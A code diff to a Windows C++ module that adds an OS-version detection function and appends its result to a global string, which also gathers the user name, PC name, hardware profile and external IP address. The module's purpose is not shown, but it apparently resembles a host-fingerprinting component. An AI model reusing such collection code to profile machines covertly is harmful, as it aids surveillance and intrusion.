@@ -32,6 +32,8 @@
 #include <sstream>
 #include <iphlpapi.h>
 #include <curl\curl.h>
+#include <VersionHelpers.h>
+
 
 namespace global 
 {
@@ -59,8 +61,12 @@ namespace global
 /// </summary>
 void GetGeneralInfo();
 
+std::string GetWindowsOSType();
+
 void cursystem::GetSysInfo()
 {
+	printf("sys info");
+
 	TCHAR string[UNLEN + 1];
 	DWORD sizeit = UNLEN + 1;
 	GetUserName((TCHAR*)string, &sizeit);
@@ -116,6 +122,8 @@ void GetGeneralInfo()
 
 	global::info += "PC name: " + pcName + '\n';
 
+
+	global::info += "OS: " + GetWindowsOSType() + '\n';
 
 
     HW_PROFILE_INFO hwProfileInfo;
@@ -193,5 +201,34 @@ void GetGeneralInfo()
 	
 	global::info += "External IP Address: " + ipAddress + '\n';
 
+
+}
+
+std::string GetWindowsOSType() {
+
+	if (IsWindows10OrGreater()) {
+		return "Windows 10";
+	}
+	else if (IsWindowsServer()) {
+		return "Windows Server";
+	}
+	else if (IsWindows8Point1OrGreater()) {
+		return "Windows 8.1";
+	}
+	else if (IsWindows8OrGreater()) {
+		return "Windows 8";
+	}
+	else if (IsWindows7OrGreater()) {
+		return "Windows 7";
+	}
+	else if (IsWindowsVistaOrGreater()) {
+		return "Windows Vista";
+	}
+	else if (IsWindowsXPOrGreater()) {
+		return "Windows XP";
+	}
+	else {
+		return "Unknown Windows version";
+	}
 
 }
